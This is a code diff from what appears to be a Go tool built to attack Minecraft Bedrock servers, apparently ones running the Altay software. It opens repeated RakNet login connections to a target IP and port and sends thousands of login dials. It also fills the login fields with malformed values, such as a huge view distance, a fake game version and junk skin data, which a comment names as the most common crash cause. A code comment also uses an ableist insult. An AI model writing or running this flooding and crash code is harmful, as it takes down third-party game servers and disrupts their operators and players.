@@ -21,16 +21,16 @@ func main() {
 
     clientData := login.ClientData{
         ThirdPartyNameOnly: true,
-        MaxViewDistance:    320000, // Better altay is retarded accept
-        MemoryTier:         100,    // Typical memory tier
+        MaxViewDistance:    32000000, // Better altay is retarded and will accept
+        MemoryTier:         100,    
         IsEditorMode:       false,
         DeviceModel:        "device_model",
-        GameVersion:        "1.21.50", // .41 :(
+        GameVersion:        "WTF",
         PremiumSkin:        true,
         ThirdPartyName:     "Username",
-        SkinData:           "",
+        SkinData:           "aiaiabevejsoaownnwnwkaowoai", //most common crash cause in altay
         CurrentInputMode:   1,
-        CapeData:           "",
+        CapeData:           "72919010101873",
     }
 
     identityData := login.IdentityData{
@@ -52,7 +52,7 @@ func main() {
             conn, err = dialer.Dial("raknet", targetIP+":"+targetPort)
             if err == nil {
                 log.Println("Sent login dial")
-                sendMultipleDials(conn, 50000)
+                sendMultipleDials(conn, 5000)
                 break
             }
             log.Printf("Error (may be outdated client or spawn): %v. Retrying in %v...\n", err, baseDelay)
@@ -67,8 +67,7 @@ func main() {
             log.Printf("DoSpawn error: %v", err)
             continue 
         }
-
-        // Read packets from the connection until finish
+        
         for {
             pk, err := conn.ReadPacket()
             if err != nil {
